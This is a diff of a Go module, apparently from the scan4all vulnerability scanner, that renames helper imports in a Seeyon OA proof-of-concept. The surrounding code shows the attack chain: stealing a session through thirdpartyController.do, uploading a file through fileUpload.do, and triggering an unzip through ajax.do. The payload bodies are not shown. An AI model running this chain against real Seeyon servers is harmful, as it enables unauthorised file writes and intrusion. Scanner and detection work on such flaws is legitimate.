@@ -3,7 +3,7 @@ package seeyon
 import (
 	"bytes"
 	"fmt"
-	"github.com/hktalent/scan4all/pkg"
+	"github.com/hktalent/scan4all/lib/util"
 	"mime/multipart"
 	"net/textproto"
 	"regexp"
@@ -16,7 +16,7 @@ func SessionUpload(u string) bool {
 	if session := getsession(u); session != "" {
 		if filename := upload(u, session); filename != "" {
 			if unzip(u, filename, session) {
-				pkg.GoPocLog(fmt.Sprintf("Found vuln seeyon poc SessionUpload|%s\n", u))
+				util.GoPocLog(fmt.Sprintf("Found vuln seeyon poc SessionUpload|%s\n", u))
 				return true
 			}
 		}
@@ -29,8 +29,8 @@ func getsession(u string) string {
 
 	header := make(map[string]string)
 	header["Content-Type"] = "application/x-www-form-urlencoded"
-	if req, err := pkg.HttpRequset(u+"/seeyon/thirdpartyController.do", "POST", data, false, header); err == nil {
-		if req.StatusCode == 200 && pkg.StrContains(req.Body, "a8genius.do") && req.Header.Get("Set-Cookie") != "" {
+	if req, err := util.HttpRequset(u+"/seeyon/thirdpartyController.do", "POST", data, false, header); err == nil {
+		if req.StatusCode == 200 && util.StrContains(req.Body, "a8genius.do") && req.Header.Get("Set-Cookie") != "" {
 			return req.Header.Get("Set-Cookie")
 		}
 	}
@@ -58,8 +58,8 @@ func upload(u string, cookie string) string {
 	header := make(map[string]string)
 	header["Content-Type"] = "multipart/form-data; boundary=" + boundary
 	header["Cookie"] = cookie
-	if req, err := pkg.HttpRequset(u+"/seeyon/fileUpload.do?method=processUpload", "POST", buf.String(), false, header); err == nil {
-		if req.StatusCode == 200 && pkg.StrContains(req.Body, "fileurls=fileurls") {
+	if req, err := util.HttpRequset(u+"/seeyon/fileUpload.do?method=processUpload", "POST", buf.String(), false, header); err == nil {
+		if req.StatusCode == 200 && util.StrContains(req.Body, "fileurls=fileurls") {
 			filenamelist := regexp.MustCompile(`fileurls=fileurls\+["'],["']\+["'](.+)["']`).FindStringSubmatch(req.Body)
 			if filenamelist != nil {
 				filename := filenamelist[len(filenamelist)-1:][0]
@@ -75,7 +75,7 @@ func unzip(u string, filename string, cookie string) bool {
 	header := make(map[string]string)
 	header["Content-Type"] = "application/x-www-form-urlencoded"
 	header["Cookie"] = cookie
-	if req, err := pkg.HttpRequset(u+"/seeyon/ajax.do", "POST", data, false, header); err == nil {
+	if req, err := util.HttpRequset(u+"/seeyon/ajax.do", "POST", data, false, header); err == nil {
 		if req.StatusCode == 500 {
 			return true
 		}
